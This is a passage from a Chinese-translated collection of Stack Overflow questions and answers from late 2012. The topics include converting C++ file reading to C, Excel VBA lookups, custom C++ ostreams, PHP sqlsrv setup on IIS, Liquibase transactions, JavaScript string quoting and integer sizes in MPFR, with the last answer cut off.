        ClientResponse response = webResource.type("application/json")
           .post(ClientResponse.class, input);

        if (response.getStatus() != 201) {
            throw new RuntimeException("Failed : HTTP error code : "
                 + response.getStatus());
        }

        System.out.println("Output from Server .... \n");
        String output = response.getEntity(String.class);
        System.out.println(output);

      } catch (Exception e) {

        e.printStackTrace();

      }

    }
} 
```

# c++ - 如何将此程序从 C++ 转换为 C？

> ID：13703811
> 
> 赞同：-3
> 
> 时间：2012-12-04T13:14:32.457
> 
> 标签：c++, c, file-io, readfile

我需要将程序的这一部分从 C++ 转换为 C，你能帮我吗？

```
float ** OpenRotGrid_H(float **grid, unsigned int &nl, unsigned int & nc, bool &ok){
    ifstream fs;
    string line, num;
    unsigned int l(0),c(0),i(0),ncmax(0);

    fs.open("CarmY.txt");
    if (!fs) {
        //std::cout<<"Error: the Error file 'CarmY.txt' cannot be open\n\n";
        ok=false;
    }
    else{
        //size of the file
        getline(fs,line);
        ncmax= line.size()/MAXFLOAT;
        nl++;
        while(getline(fs,line)){
            nl++;
        }
        fs.clear();

        //Read CarmY values ( = grid)
        grid = initialize(nl,ncmax);
        fs.seekg(0,ios::beg); //initial position in the file

        while(getline(fs,line)){
            i=0;
            c=0;
            while(i<line.length()){
                while(i<line.length() && line[i]!='\t'){
                    num.push_back(line[i]);
                    i++;
                }
                grid[l][c]=(float) atof(num.c_str());
                c++;
                num.clear();
                if(i<line.length() && line[i]!='\n') i++;
            }
            l++;
        }
        nc=c;
        fs.close();
    }
    return grid;
}

int main(){

unsigned int nl=0 , nc=0 , nangle=0, nrot=0;
float **grid;
bool ok;

grid=initialize(nangle, nrot);
OpenRotGrid_H(grid, nl, nc, ok);

return 0;

} 
```

文件“C-arm”有一些不同长度的数字行，这个程序打开这个文件并取出每个数字并将其写入网格。

例如，我不知道我可以使用什么来代替`getline(fs,line)`,`fs.seekg`和 ...？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:19:57.233

好吧，击中明显的候选人：

*   C中没有引用（例如`unsigned int &nl`），因此您需要传递指针并通过取消引用这些指针来更改基础数据。
*   你可以只使用`int`而不是`bool`.
*   C,中没有`ifstream`对象，请使用`fopen`调用来打开文件。
*   `getline`可以变成`fgets`.
*   您可以使用`fseek`而不是`seekg`.
*   C 中没有智能字符串，您需要在稍低的级别（字符数组）管理它们。
*   `length`可以替换为`strlen`。

几乎可以肯定还有其他一些小问题，但这应该是一个好的开始。

# excel - 根据一组 ID 对另一张工作表中的值求和

> ID：13703812
> 
> 赞同：0
> 
> 时间：2012-12-04T13:14:35.140
> 
> 标签：excel, excel-2010

我想创建一个工作簿，帮助人们记录他们的饮食习惯。该工作簿目前有两张纸，“食谱”和“日记”。

食谱有 ID、NAME、KCAL 和 PROTEIN 列。用户可以添加他们经常使用的任何食谱，并使用数字 ID 来引用它们。

日记有列 DATE、TOTAL_KCAL 和 TOTAL_PROTEIN。这个想法是用户可以看到每个日期的能量和蛋白质摄入总量。

我已经想出了如何使用 VLOOKUP() 从食谱表中获取单个食谱的千卡和蛋白质量到日记表中：

```
=VLOOKUP(1;Table1;3;FALSE) //For kcal 
```

但我真的很想自动化一点。在这个阶段，如果我想使用这张表，我需要复制整个函数（并添加一个 + 前缀），将其粘贴到最后并将第一个参数更改为正确的 ID。然后我还必须对 TOTAL_PROTEINS 列重复此过程（我需要记住将源参数从 3 更改为 4）。

我想最佳情况是如果日记表也有一些 EATEN_RECIPES 列，人们可以在其中添加 ID 列表 (1,15,6)，但我不知道这在 excel 中是否可行。关键是，我希望能够在日记中记下 ID，并让 Excel 自动从食谱表中获取千卡和蛋白质含量，并更新日记中的总量。

这可能是一件很简单的事情，但我不知道在谷歌中使用什么搜索词，对此的任何评论表示赞赏。（我还需要一个更好的标题。）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:26:41.490

如果我理解您正在尝试正确执行的操作，您可以通过在要获取的数据前加上 ! 来引用另一张表中的数据来解决您的复制和粘贴问题。例如，如果您的数据在 Sheet1 中，在 A1:A7 的范围内，您可以在公式和函数中引用它：

```
Sheet1!A1:A7 
```

至于 ID 列表...您可以尝试以此为起点：

[http://www.ozgrid.com/forum/showthread.php?t=86497](http://www.ozgrid.com/forum/showthread.php?t=86497)

它进入自定义编码......您也可以让用户将每个 id 输入到不同的列中，但这是一个丑陋的 hack。

顺便说一句，听起来你正在做的事情正在接近数据库领域...... Excel 工作表通常最终成为他们自己的迷你数据库。如果您对数据库感到满意，并且不介意这项工作，您可以考虑使用数据库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T20:51:40.590

这是我最终得到的功能。基于 user1161318 提供的 URL。我知道它不是那么漂亮，但我只是想让它工作，而且我是 Visual Basic 的新手。

```
Function MultiVLookup2(LookUpVal, LookUpRng As Range, LookUpCol As Long)

Dim v, w, i, rng As Range, sum As Single

v = Split(LookUpVal, ",")
sum = 0

ReDim w(UBound(v, 1))

For i = LBound(v, 1) To UBound(v, 1)
    w(i) = WorksheetFunction.VLookup(Val(v(i)), LookUpRng, LookUpCol, False)
Next i

For i = LBound(v, 1) To UBound(v, 1)
    sum = sum + w(i)
Next i

MultiVLookup2 = Round(sum, 1)

End Function 
```

# javascript - JQuery scrollTop 不能正常工作

> ID：13703818
> 
> 赞同：0
> 
> 时间：2012-12-04T13:15:06.407
> 
> 标签：javascript, jquery, scroll

我正在尝试滚动到具有两个类的 div`class="media unread"`

我把这条线放在`application.js`里面`$(document).ready(function() {`

```
$("html,body").animate({ scrollTop: $(".media.unread").offset().top - (window.innerHeight || document.documentElement.clientHeight) + $(".media.unread").height() + 15} , 800); 
```

这在 Firefox 中效果很好，但在 chrome 上我需要手动向下滚动一点才能到达 div 并使其可见

我错过了什么吗？还是我的铬坏了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T17:01:32.013

为什么不使用`$('.media.unread').offset().top`scrollTop？我想，你可以得到它。

如果我有错误，请告诉我详细信息！

谢谢

# c++ - 自定义 ostream

> ID：13703823
> 
> 赞同：27
> 
> 时间：2012-12-04T13:15:19.117
> 
> 标签：c++

我需要一些指导或指针来了解如何实现自定义 ostream。我的要求是：

1.  具有用于多种数据类型的“<<”运算符的类。
2.  目的是将输出发送到数据库。每个“行”都应该转到单独的记录。
3.  每个记录最重要的字段是文本（或blob），但其他一些字段如时间等大部分可以自动推断
4.  缓冲很重要，因为我不想为每条记录都去数据库。

首先，是否值得从 ostream 派生？我从 ostream 派生得到什么？如果我的类只实现了几个`operator<<`方法（包括一些自定义数据类型）怎么办。我可以从 ostream 获得哪些功能？

假设我想要的是一个从 ostream 派生的类，我需要一些指导来理解 ostream 和 streambuf 类之间的关系。我需要实施哪一项？查看一些示例，似乎我根本不需要从 ostream 派生，只需给 ostream 构造函数一个自定义的 streambuf。真的吗？这是规范的方法吗？

我需要在自定义 streambuf 中实现哪些虚拟功能？我看过一些示例（包括这个站点：[here](https://stackoverflow.com/q/760301/341971)和[here](https://stackoverflow.com/q/4366904/341971)，以及其他一些示例），一些覆盖了该`sync`方法，而另一些则覆盖了该`overflow`方法。我应该覆盖哪一个？此外，查看 stringbuf 和 filebuf 源（Visual Studio 或 GCC），这两个缓冲区类都实现了 streambuf 的许多方法。

如果需要从 streambuf 派生的自定义类，那么从 stringbuf（或任何其他类）而不是直接从 streambuf 派生是否有任何好处？

至于“线”。我希望至少当我的班级用户使用“endl”操纵器成为一个新行（即数据库中的记录）时。也许 - 取决于努力 - 每个 '\n' 字符也应该被视为一个新记录。我的自定义 ostream 和/或 streambuf 会分别通知谁？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-01-09T10:03:59.837

ostream 的自定义目标意味着实现您自己的 ostreambuf。如果您希望您的 streambuf 实际缓冲（即在每个字符之后不连接到数据库），最简单的方法是创建一个继承自`std::stringbuf`. 您需要覆盖的**唯一**`sync()`函数是方法，每当刷新流时都会调用该方法。

```
class MyBuf : public std::stringbuf
{
public:
    virtual int sync() {
        // add this->str() to database here
        // (optionally clear buffer afterwards)
    }
}; 
```

`std::ostream`然后，您可以使用缓冲区创建一个：

```
MyBuf buff;
std::ostream stream(&buf) 
```

大多数人建议不要将流重定向到数据库，但他们忽略了我的描述，即数据库基本上只有一个 blob 字段，所有文本都将转到该字段。在极少数情况下，我可能会将数据发送到不同的字段。这可以通过我的流理解的自定义属性来促进。例如：

```
MyStream << "Some text " << process_id(1234) << "more text" << std::flush 
```

上面的代码将在数据库中创建一条记录：

```
blob: 'Some text more text'
process_id: 1234 
```

`process_id()`是一种返回结构的方法`ProcessID`。然后，在我的 ostream 的实现中，我有一个`operator<<(ProcessID const& pid)`，它存储进程 ID 直到它被写入。效果很好！

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-12-04T13:32:20.233

最简单的方法是仅继承`std::streambuf`和覆盖两个方法：

*   `std::streamsize xsputn(const char_type* s, std::streamsize n)`– 附加一个给定的缓冲区，其大小提供给您的内部缓冲区，`std::string`例如；
*   `int_type overflow(int_type c)`– 将单个附加`char`到您的内部缓冲区。

您的 streambuf 可以从您想要的任何内容构建（例如 DB 连接）。将某些内容附加到内部缓冲区后，您可能会尝试将其拆分为行并将某些内容推送到 DB（或者只是缓冲 SQL 语句以稍后执行）。

要使用它：只需将您的附加`streambuf`到任何`std::ostream`使用构造函数。

简单的！我已经做了类似的事情来将字符串输出到 syslog - 一切都适用`operator<<`于用户定义的任何自定义类。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-04T13:56:01.610

my2c - 我认为您以错误的方式解决了这个问题。流听起来可能是个好主意，但是您也需要一种方法来指示行的末尾（如果有人忘记了怎么办？）我会建议一些类似于 java PreparedStatements 和批处理如何工作的内容，如提供一组接受类型和列索引的方法，然后是一个“批处理”方法，它明确表明您确实在批处理该行，然后执行以将批处理推入。

任何基于流的操作都将依赖于类型（通常）来指示要填充哪一列——但是如果你有两个整数呢？IMO，作为用户，将记录插入数据库并不是一种自然的方式......

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-04T14:29:01.850

要将字符输入/输出的新源或目标添加到 iostreams 机制，您应该创建一个新`streambuf`类。流缓冲区类的任务是与将存储字符的“外部设备”通信并提供缓冲设施。

使用 iostream 与数据库通信的问题是数据库表与字符序列的概念不匹配。有点像在方孔中推一个圆钉。A`streambuf`只对字符起作用。这是唯一呈现给它的东西。这意味着`streambuf`必须解析提供给它的字符流以找到字段和记录分隔符。如果你决定走这条路，我预测你最终会在你的 .csv 文件中编写一个 CSV-to-SQL 转换器`streambuf`，只是为了让它工作。

您可能会更好地`operator<<`为您的类添加一些重载。您可以在此处查看 Qt 框架的想法。它们还可以`operator<<`用于将项目添加到集合等。

# php - PHP IIS7 MSSQL 调用未定义函数 sqlsrv_connect

> ID：13703824
> 
> 赞同：5
> 
> 时间：2012-12-04T13:15:19.350
> 
> 标签：php, sql-server-2008, iis-7

我有 MSSQL Server 2008、MS WINDOWS SERVER 2008 RC2 和 PHP 5.4

php.info 有行

```
[PHP_PDO_SQLSRV_54_NTS]
extension=php_pdo_sqlsrv_54_nts.dll
[PHP_PDO_ODBC]
extension=php_pdo_odbc.dll
[PHP_SYBASE_CT]
extension=php_sybase_ct.dll
[PHP_SQLSRV_54_NTS]
extension=php_sqlsrv_54_nts.dll 
```

在这里找到的 PHP 信息`http://89.111.180.28/index.php`

**我看到带有扩展名 php.ini 的行，但我在 php.info 中没有看到带有扩展名 SQLSRV 的行...**

连接到 MSSQL SERVER 我使用脚本

```
$conn_array = array (
            "UID" => "user", 
            "PWD" => "passw", 
            "Database" => "database",
            "Encrypt" => 1,
            "TrustServerCertificate" => 1) ;

$conn2 = sqlsrv_connect('localhost' , $conn_array);

if ($conn2)
    {
        echo 'MSSQL Connection successful';
    }
else
    {
        die( print_r( sqlsrv_errors(), true));
    }

sqlsrv_close( $conn2 ); 
```

但我看到错误：

```
Fatal error: Call to undefined function sqlsrv_connect() in C:\inetpub\wwwroot\89.111.180.28\index.php on line 18 
```

请告诉我为什么我有错误以及如何正确？

ps：服务器已经重启。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-01-26T03:06:27.957

我自己也遇到了这个问题。我终于把它修好了，所以我想我会分享的。

* * *

问题是，虽然我安装了 sqlsrv dll（复制到我的 php/ext 文件夹），*并且*我将它添加到我的 php.ini 中，**但在 IIS 中，它是 'disabled'**。

这里有一些分步说明，以防有人再次遇到同样的问题。（或供我将来参考:)）

1.  [下载（并安装）SQL Server 驱动程序](https://www.microsoft.com/en-us/download/details.aspx?id=20098)(.dll)

    *   通过运行 .exe 安装它们，并在它询问您解压缩它们的位置时键入您的 php 扩展文件夹的路径。
        *   要查找您当前的扩展目录，请运行 (cmd.exe)`php -i | more`并查找行`extension_dir`. （对我来说，这是在第四次按下`more`）。或者，制作一个仅包含 的简单 php 文件`<?php phpinfo(); ?>`，然后在浏览器中运行它。这将提供相同的信息，但格式更易于阅读。
2.  将扩展添加到您的 php.ini

    *   要找到正确的 php.ini，请`php -i | more`再次运行，寻找`Loaded Configuration File`，或再次检查该简单的 php 脚本（我强烈建议您制作它 - 它会节省您的时间和精力）。您在那里找到的路径是您需要编辑的文件。
    *   将以下行添加到您的 php.ini 中，并保存它：

        `[PHP_SQLSRV] extention=php_sqlsrv_56_nts.dll`

3.  在 IIS 管理器中启用扩展

    *   在开始菜单中，键入`IIS Manager`，然后按 Enter。
    *   在左侧栏中单击您的服务器名称
    *   点击`PHP Manager`
    *   在 下`PHP Extensions`，单击`Enable or Disable an Extension`。
    *   如果您的分机不在 下方`Enabled`，请在下方查找`Disabled`。找到它后，右键单击它，然后单击`Enable`出现的上下文菜单。
4.  测试以确保它有效

    *   打开您创建的`phpinfo()`页面（您做了，不是吗？），然后查看`Registered PHP Streams`. 如果您`sqlsrv`在该列表中看到，则说明您已设置好！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-01-06T22:47:35.077

您的回答肯定帮助我调试了我的问题。继续为可能已成功安装 PHP PDO SQLSRV .dll 模块但仍遇到相同错误的其他人回答此问题。

我花了将近一个小时才弄清楚这一点，但即使在我配置了 PHP_PDO_SQLSRV 之后，该功能`sqlsrv_connect()`仍然无法正常工作。

发现这是因为如果您使用的是 PDO sqlsrv 扩展，它有自己的库和单独的函数。

要连接到数据库，您可以执行以下操作：

```
$conn = new PDO("sqlsrv:Server=localhost;Database=testdb", "UserName", "Password");
```

你可以在这里查看所有这些：

[http://msdn.microsoft.com/en-us/library/ff628159(v=sql.105).aspx](http://msdn.microsoft.com/en-us/library/ff628159(v=sql.105).aspx)

如果您不确定 PDO 和普通 SQLSRV 之间的区别，请参考这篇文章：

[SQLSRV 驱动程序与带有 MS SQL Server 的 PHP 的 PDO 驱动程序](https://stackoverflow.com/questions/11614536/sqlsrv-driver-vs-pdo-driver-for-php-with-ms-sql-server)

我选择 PDO 是因为我更喜欢将数据作为字符串返回（对我来说访问速度更快，而不是解析对象/类类型）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-05T08:48:51.043

我了解情况。

我用的PHP版本是5.4以上，所以使用PHP驱动为Windows 3.0。

对于此配置，需要 SQL 2012 的客户端版本，但我一直是客户端 SQL 2008 版本

问题解决了。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-02-28T20:15:35.533

如果您使用 sql server 2008 r2，您需要做的就是下载缺少的组件，如数据库管理器和其他类似 microsoft sql server 2008R2 管理对象，并继续下载直到成功

# java - 一个事务中的删除和选择操作

> ID：13703827
> 
> 赞同：1
> 
> 时间：2012-12-04T13:15:29.927
> 
> 标签：java, database, transactions

嗨，我有一个事务，其中我根据给定的数据从表中删除一些行，然后我正在对同一个表上的相同数据进行选择查询。我试过了，它成功发生了。但是如果去当我们尝试在那个时间点执行删除操作时，事务逻辑会在表上应用锁，因此除非提交事务，否则可能无法从表中读取相同的数据。所以我想知道这种情况是否有效，或者我的理解存在一些错误。

函数内部的主体遵循以下顺序：

```
public void method(){

//transaction starts

// delete operation on table 1

// select operation on table 1

// transaction is committed. 

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:26:25.470

*在同一事务的上下文中*删除然后选择数据不会有任何问题。

如果有多个并发事务处理相同的数据，您可能需要考虑锁定。确切的机制取决于事务正在做什么、DBMS 引擎、事务隔离级别等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-17T19:58:21.213

您没有说您使用的是什么数据库，但以下内容应该是通用的和常见的。

如果您的方法对删除和选择使用相同的连接，则从连接的上下文（观点）来看，删除已经发生，因此您的“针对同一张表上的相同数据”的查询将不返回任何记录。

从所有其他并发连接（包括您的方法，如果它没有使用相同的连接进行删除和选择），您的工作没有提交，因此根据技术和设置，它们***可能会***被阻止甚至查看，直到您回滚或提交或者他们可能会看到您的交易开始之前的数据版本。

# android - 我的 customarayaadapter 似乎传递了错误的 var

> ID：13703828
> 
> 赞同：1
> 
> 时间：2012-12-04T13:15:31.537
> 
> 标签：android, gridview, adapter

我有一个 customArrayAdapter 在我的 gridview 中显示我的图片。当我打开活动时，一切顺利，但是当我向下滚动和备份时，它显示一些项目的三角形红色，而该 ID 的图片正确为 1（我在 DDMS 中检查了我的数据库以确保）。它似乎一直在发生相同的项目......这是我的自定义适配器的一部分：

```
if (mView == null) {

            LayoutInflater vi = (LayoutInflater) getContext().getSystemService(
                    Context.LAYOUT_INFLATER_SERVICE);
            mView = vi.inflate(R.layout.caa_xml, null);
        }

        ImageView image = (ImageView) mView.findViewById(R.id.iv_caarow);
        ImageView triangle = (ImageView) mView.findViewById(R.id.iv_triangle);
        image.setAlpha(255);
        triangle.setVisibility(View.INVISIBLE);

        //… some additional code to define resizedBitmap

        BitmapDrawable bmd = new BitmapDrawable(resizedBitmap);

        image.setImageDrawable(bmd);

        if (mView != null) {

            Picture pictureGiven = null;
            loadDataBase();
            pictureGiven = myDbHelper.getPictureGiven(getItem(position).getId(),
                    player);

            int attempts = pictureGiven.getAttempts();
            int correctPicture = pictureGiven.getPictureCorrect(); //returns 0 or 1

            triangle.setVisibility(View.INVISIBLE);
            if (correctPicture == 1) {
                triangle.setVisibility(View.VISIBLE);
                            } 
            if (correctPicture != 1 && attempts > 0) {
                triangle.setVisibility(View.VISIBLE);
                triangle.setImageResource(R.drawable.trianglered);

            }

        }
        return mView;
    } 
```

有什么想法可能导致这种情况吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:20:37.497

由于视图回收，您需要在每种可能的情况下设置三角形的内容。

在这里，如果correctPicture == 1，您的三角形图像资源就是以前的任何东西，可能是三角形的。

```
 if (correctPicture == 1) {
            triangle.setVisibility(View.VISIBLE);
                                   // Add whatever initial value it is
            triangle.setImageResource(R.drawable.initvalue);
        } 
```

# spring - Liquibase 事务在 Spring 环境中不起作用

> ID：13703829
> 
> 赞同：2
> 
> 时间：2012-12-04T13:15:34.360
> 
> 标签：spring, transactions, rollback, liquibase

~~我在具有 Spring 环境的项目中使用 Liquibase。但是回滚功能似乎不起作用。~~

我怀疑使用 Spring 运行 Liquibase 时不支持回滚功能，因为[手册](http://www.liquibase.org/manual/rollback)说：

> LiquiBase 允许您自动或通过自定义回滚 SQL 撤消对数据库所做的更改。回滚支持在命令行、Ant、Maven 和 Grails 中可用。

~~但是，很难相信在此设置中不可能进行回滚。所以问题是：“为什么回滚不起作用，我怎样才能让回滚起作用？”~~

* * *

**编辑：**

我现在意识到我应该问这个问题有点不同。我想要的回滚是在迁移时出现问题时发生的回滚。

我尝试使用事务（因为我假设这些事务在那里），但这并没有达到想要的效果。

将出错的更改集示例：

```
<changeSet runInTransaction="true">
    <createTable tableName="table1">
        <column name="a" type="int"/>
    </createTable>
    <createTable tableName="table1">
        <column name="a" type="int"/>
    </createTable>
    <createTable tableName="table2">
        <column name="a" type="int"/>
    </createTable>
</changeSet> 
```

当我运行示例更改集时，Liquibase 设法创建 table1 但是当它尝试创建另一个具有相同名称的表时它失败了（显然）。创建的表不会被删除，而是持久化到数据库中。

查看[Liquibase 手册](http://www.liquibase.org/manual/changeset)，我注意到：

> **runInTransaction**
> 
> changeSet 是否应该作为单个事务运行（如果可能）？默认为真。**警告：小心这个属性。如果设置为 false 并且在运行包含多个语句的 changeSet 的过程中发生错误，则 LiquiBase databasechangelog 表将处于无效状态** *自 1.9*

我正在使用 MySQL，但更改集也必须与 MSSQL 和 Oracle 一起使用。

我也在使用 Spring 的事务，并且这些工作完美，关于如何同时获得 Liquibase 的令人敬畏和那些令人敬畏的（数据库独立）事务的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T22:21:07.560

根据文档，[spring 集成](http://www.liquibase.org/manual/spring)似乎旨在支持数据库迁移。

要执行回滚，您可以按如下方式使用 liquibase jar（请参阅[命令行](http://www.liquibase.org/manual/command_line)文档）：

```
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=website.war \
      --changeLogFile=com/example/db.changelog.xml \
      --url=jdbc:oracle:thin:@localhost:1521:oracle \
      --username=scott \
      --password=tiger \
      rollbackCount ? 
```

数据库 JDBC jar 和更改日志都应该可以从 WAR 文件中获得。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T21:56:31.657

据我回忆，spring 集成是将数据库迁移为后处理步骤。由于没有交互式步骤，您将没有机会指定命令，例如“回滚一个变更集”。

对于回滚 n 更改等交互式步骤，您需要使用 CLI，或者通过 Ant 或 Maven 构建脚本。

**后编辑**

事务级回滚取决于底层数据库实现。有些，如 Oracle，不允许在事务回滚期间回滚 DDL 命令（例如 create table）。我发现对于这些情况，最好将每个 DDL 语句放在自己的变更集中，以防万一失败。事实上，如果您对现有数据库运行 generateChangeLog 命令，您会发现 Liquibase 会为每个 DDL 命令生成一个变更集。但是，您仍然应该对其他类型的命令进行事务级恢复，例如插入等。

# javascript - 函数参数未定义

> ID：13703830
> 
> 赞同：1
> 
> 时间：2012-12-04T13:15:39.457
> 
> 标签：javascript

我对代码中的几个函数感到非常沮丧。当用户单击链接时，我有几个函数会触发。
该参数已正确发送到这两个函数，但是当用户单击链接时，`detailplace`我得到一个参考错误，这`SomeName`是未定义的。功能细节似乎没有问题。为什么`detail`有效但`detailplace`无效？

HTML

```
<a href="javascript:detail(123456);">Details</a>
<a href="javascript:detailplace(SomeName);">Details</a> 
```

Javascript

```
function detail(property) {
    var summaryhtml = '<iframe src="' + URL + property + '" width="340px" height="400px" frameborder="0" class="sum_frame"></iframe>';
    document.getElementById('itab1').innerHTML = summaryhtml;
}

function detailplace(place) {
    var summaryhtml = '<iframe src="' + URL + place + '" width="340px" height="400px" frameborder="0" class="sum_frame"></iframe>';
    document.getElementById('itab1').innerHTML = summaryhtml;
} 
```

我听取了您的建议并编辑了代码以包含引号。问题是我正在构建 javascript 中的链接。SomeName 在别处定义为字符串。

```
link = '<a href="javascript:detailplace(&quot;';
link += SomeName;
link += '&quot;)";>Site Details</a>'; 
```

什么是在引号内转义引号的正确方法，以便我可以将字符串作为参数发送？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:17:29.393

你必须`SomeName`用`quotes`：

```
<a href="javascript:detailplace('SomeName');">Details</a> 
```

当你不带引号传递它时`javascript`，它认为它是变量，即`undefined`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:17:55.883

`SomeName`以上被用作*变量*而不是*字符串*。您缺少引号。

```
<a href="javascript:detailplace('SomeName');">Details</a> 
```

如果没有引号，它会寻找一个名为的变量，该变量`SomeName`将包含您要填充的位置的名称。明白我的意思了吗？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:18:03.257

如果`SomeName`不是先前定义的变量，而是要传递给方法的实际文字文本，则需要将其放在引号中。

```
javascript:detailplace('SomeName'); 
```

# php - 如何将响应文本显示为 html 并同时发送到 php 页面

> ID：13703832
> 
> 赞同：0
> 
> 时间：2012-12-04T13:15:40.923
> 
> 标签：php, javascript, ajax, open-flash-chart

计算.php

```
<form method="post" name="frm_deptcal" id="frm_deptcal"     action="javascript:add(document.getElementById('frm_deptcal'));" >
<span style="font-weight:bold;">Enter your total unsecured* debt </span>
<input type="text" name="txt_principal" id="txt_principal" / >
<input type="submit" name="button" value="Calculate" style="background: none repeat scroll 0% 0% rgb(51, 136, 180); color: white; border: 5px solid rgb(120, 176, 205); cursor: pointer;">
</form> 
```

在 ajax_cal.js 我有 add() 在其中创建 XMLHttpRequestObject 并且字符串是发送
代码：

```
var str1= "txt_principal=" + document.getElementById("txt_principal").value;
XMLHttpRequestObject.onreadystatechange = show;
XMLHttpRequestObject.open('POST', 'value.php', true);
XMLHttpRequestObject.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
XMLHttpRequestObject.send(str1); 
```

在 value.php 我已经完成了计算：

```
$principal=$_POST['txt_principal'];    
$x=0.3;
$consumer_mon_pay=60;
$mp_consumer_ans=($principal * $x)/$consumer_mon_pay;
$mp_consumer=round($mp_consumer_ans,3)   ;         
echo $mp_repay."[BRK]".$mp_conloan."[BRK]".$mp_credit."[BRK]".$mp_consumer; 
```

在 ajax_cal.js 我得到了 html 的响应并显示在文本框中

```
function show()
{
    if (XMLHttpRequestObject.readyState == 4)
    {
        if (XMLHttpRequestObject.status == 200)
        {
            data = XMLHttpRequestObject.responseText.split("[BRK]");
            document.getElementById('txt_mp_repay').innerHTML = data[0];
            document.getElementById('txt_mp_conloan').innerHTML = data[1];   
            document.getElementById('txt_mp_credit').innerHTML = data[2];  
            document.getElementById('txt_mp_consumer').innerHTML = data[3];  

        }
    }

} 
```

现在我的问题是我必须绘制一个动态图，其 x 轴应该是 (txt_mp_repay,txt_mp_conloan,txt_mp_credit,txt_mp_consumer ) 值，y 轴将是 txt_mp_repay 值。条形图编码是使用图表中的 open-flash 图表完成的-data.php 通过它我创建了一个静态图。问题是如何将响应发送到 chart-data.php 并在计算 .php 页面上显示整个内容。帮助我...谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:59:39.503

我有点不清楚你想做什么，但没有什么能阻止你同时发送两个 ajax 请求。喜欢

```
var str1= "txt_principal=" + document.getElementById("txt_principal").value;
XMLHttpRequestObject.onreadystatechange = show;
XMLHttpRequestObject.open('POST', 'value.php', true);
XMLHttpRequestObject.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
XMLHttpRequestObject.send(str1);    
XMLHttpRequestObject.open('POST', 'chart.php', true);
XMLHttpRequestObject.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
XMLHttpRequestObject.send(str1); 
```

# c++ - 32 位 Linux 与 64 位 Linux 和 MPFR 上的 long long int

> ID：13703842
> 
> 赞同：0
> 
> 时间：2012-12-04T10:28:17.417
> 
> 标签：c++, gcc, mpfr

`long long int`与 64 位 Linux 相比，32 位 Linux 系统究竟如何处理？

在我的 32 位系统上，我对 MPFR 数据类型使用[C++ 包装器；](http://www.holoborodko.com/pavel/mpfr/)这个包装器有一个为`long int`但不是定义的构造函数`long long int`。然而，在 32 位系统上，这段代码可以正常工作：

```
long long int i=5LL;
mpreal myVar(i);
cout<< "this was constructed with a long long int:" <<myVar <<endl; 
```

这怎么可能？32 位 gcc 是否只是以某种方式将数据类型`long long int`转换`long int`为具有构造函数的语句*？*如果上面的代码在 64 位 Linux 上运行，那么编译器会导致构造不明确的错误。`mpreal`

 *我知道有些人会告诉我根本不要`long long int`在 64 位上使用，但不幸的是，我正在使用另一个库（odeint），它内置在代码中以这种方式构造我给定的多精度数据类型，所以我不'认为我不能改变事情。

无论如何与64位`long long int`完全相同吗？`long int`如果我投到 会丢失数据`long int`吗？例如，如果我制作自己的构造函数，例如：

```
mpreal(const long long int u, mp_prec_t prec, mp_rnd_t mode)
{
    mpfr_init2(mp,prec);
    mpfr_set_si(mp, u, mode);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T10:07:40.687

我向 mpreal.h 的作者询问了这个问题（完整的答案在[http://www.holoborodko.com/pavel/mpfr/#comment-7444](http://www.holoborodko.com/pavel/mpfr/#comment-7444)`long long int` ），首先是关于在 64x 系统上构建一个新的构造函数：

```
>Functions “mpfr_set_ui/si” should be fine.
>Basically constructor for “long long int” should be equivalent to “long int” one.

>GNU GCC system makes porting from x32 to x64 a little bit messy. It automatically  
>upgrades integer types to x64 bits, which could easily break code being ported.

>The best workaround for GCC would be to use types with explicit number of bits:  
>int32_t, int64_t from stdint.h. Then move from x32 to x64 would be painless.

>However neither authors of MPFR nor developers of numeric libraries follow this    
>standard using “long long int”, “long int”, “intmax_t” all of which means different 
>things on x32 and x64 in GCC world.

>There is some macro-logic in mpreal.h which tries to make things smooth:
>(a) for x32 builds we define additional constructors for int64_t (aka “long long int” 
>or “intmax_t” ) 
>(b) for x64 builds we remove constructors for such type since “long int” is already 
>64bit wide.

>Macro MPREAL_HAVE_INT64_SUPPORT plays only “suggestive” role, it is undefined 
>automatically for x64 builds on GCC to avoid clash among integer types.

>The better way would be to detect bit resolution of all integer types at compile time  
>(using macros or meta-magic similar to boost) and add suitable routines to mpreal 
>class. This could easily grow to be more complex than mpreal itself :) .

>Maybe I will come up with better solution in future versions, any suggestions are 
>welcome. 
```

因此，我认为从 OP 构建我的构造函数将修复在 x64 系统上正常工作的问题，但如果回到 x32 系统则需要再次删除，否则会导致冲突。原因是`MPREAL_HAVE_INT64_SUPPORT`宏在 32x 上定义，而构造函数`int64_t`（又名`long long int`在 32x 上）被定义，所以添加另一个这样的构造函数会导致冲突；这也是我的代码在 32 系统上开箱即用的原因。在 64x 系统`MPREAL_HAVE_INT64_SUPPORT`上，宏是未定义的，并且此类构造函数已被删除，因为`long int`已经是 64 位宽，因此作者不需要`long long int`构造函数。

* * *

## 回答 #2

> 赞同：0
> 
